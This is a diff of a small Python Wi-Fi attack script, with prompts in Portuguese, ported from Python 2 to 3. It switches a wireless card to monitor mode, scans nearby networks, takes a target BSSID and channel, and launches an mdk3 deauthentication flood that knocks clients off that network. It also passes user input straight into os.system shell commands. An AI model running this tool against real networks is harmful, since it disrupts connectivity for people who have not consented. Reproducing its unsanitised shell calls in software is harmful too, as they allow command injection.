@@ -2,9 +2,11 @@
 # -*- coding: utf-8 -*-
 
 #Code: Renan H
-#Github: https://github.com/c130rg
+#Github: https://github.com/renanhsilva
 #Versão 1.0
 #Python 2.7 (As proximas versões serão p/ Python3)
+#Update para versão 3.4 (23/09/20)
+
 
 import os
 
@@ -25,7 +27,7 @@ def rede():
 	global inter
 	print ("A placa de rede sem fio precisa ter a capacidade de entrar em modo monitor\n")
 	os.system('ifconfig')
-	inter = raw_input("Digite a interface de rede sem fio (ex: wlan0)...: ")
+	inter = input("Digite a interface de rede sem fio (ex: wlan0)...: ")
 	wifidump()
 
 def wifidump():
@@ -34,10 +36,10 @@ def wifidump():
 	os.system("airmon-ng start "+ inter)
 	print("Sua placa foi alterada para o modo monitor com sucesso! Agora vamos escutar as redes em volta")
 	print("ATENÇAÕ: Quando a rede alvo for detectada, pressione CRTL+C para parar a escuta")
-	raw_input("Pressione qualquer tecla para continuar... ")
+	input("Pressione qualquer tecla para continuar... ")
 	os.system ("airodump-ng "+ inter +"mon")
-	bssid = raw_input("Digite o BSSID do alvo...: ")
-	ch = raw_input("Digite o canal da rede alvo...: ")
+	bssid = input("Digite o BSSID do alvo...: ")
+	ch = input("Digite o canal da rede alvo...: ")
 	deauth()
 
 def deauth():
@@ -48,7 +50,7 @@ def deauth():
 	os.system("mdk3 "+ inter +"mon d -c "+ ch +" -b blacklist.txt")
 	print ("Ataque parado com sucesso")
 	os.system("rm blacklist.txt")
-	r = raw_input("Deseja testar outro alvo? (S/N)...: ")
+	r = input("Deseja testar outro alvo? (S/N)...: ")
 	if r == "S":
 		wifidump()
 	else:
